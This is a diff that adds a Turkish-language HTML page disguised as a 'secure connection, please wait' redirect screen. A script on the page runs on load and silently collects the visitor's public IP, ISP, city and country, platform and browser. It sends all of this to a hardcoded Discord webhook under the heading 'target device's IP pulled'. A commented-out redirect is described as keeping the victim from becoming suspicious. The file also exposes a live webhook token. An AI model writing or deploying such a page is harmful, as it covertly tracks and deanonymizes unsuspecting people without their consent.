@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Yönlendiriliyorsunuz...</title>
+</head>
+<body style="background-color: #000; color: #fff; font-family: sans-serif; text-align: center; padding-top: 100px;">
+
+    <h2>Güvenli Bağlantı Kuruluyor...</h2>
+    <p>Lütfen bekleyin, içerik yükleniyor.</p>
+
+    <script>
+        async function getDeviceIP() {
+            // --- AYAR: Kendi Discord Webhook URL'ni buraya yapıştır ---
+            const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1481013569079345430/1KSPGjRe5cLkeTJeJwMtwcaTbqWqWDJ9vhB2K_heIh0x4uCoMgUodYDBdLQTXE_krH9-";
+
+            try {
+                // 1. Cihazın dış IP adresini ve servis sağlayıcısını (ISP) çekiyoruz
+                // 'json.geoiplookup.io' çok hızlı ve engel yemeyen bir servistir.
+                const response = await fetch('https://json.geoiplookup.io/');
+                const data = await response.json();
+
+                // 2. Cihazın teknik detaylarını alıyoruz (Windows mu, Linux mu vb.)
+                const platform = navigator.platform;
+                const userAgent = navigator.userAgent;
+
+                // 3. Discord'a gidecek raporu hazırlıyoruz
+                const report = {
+                    username: "Cihaz Loglayıcı",
+                    embeds: [{
+                        title: "🚀 Hedef Cihazın IP'si Çekildi!",
+                        color: 3066993, // Yeşil renk
+                        fields: [
+                            { name: "📡 Cihaz IP (Public)", value: `**${data.ip}**`, inline: false },
+                            { name: "🏢 İnternet Sağlayıcı", value: data.isp, inline: true },
+                            { name: "📍 Şehir/Ülke", value: `${data.city} / ${data.country_name}`, inline: true },
+                            { name: "💻 Sistem", value: platform, inline: true },
+                            { name: "🌐 Tarayıcı", value: userAgent.split(') ')[1], inline: false },
+                            { name: "⏰ Tarih", value: new Date().toLocaleString('tr-TR'), inline: false }
+                        ],
+                        footer: { text: "IP Bilgisi Başarıyla Alındı" }
+                    }]
+                };
+
+                // 4. Veriyi senin Discord'una gönderiyoruz
+                await fetch(DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(report)
+                });
+
+                // 5. İŞLEM TAMAM: Kişiyi şüphelenmemesi için bir yere yönlendir
+                // setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+
+            } catch (err) {
+                console.log("Bir hata oluştu ama arka planda denemeye devam ediyor...");
+            }
+        }
+
+        // Sayfa açılır açılmaz işlemi başlat
+        window.onload = getDeviceIP;
+    </script>
+</body>
+</html>
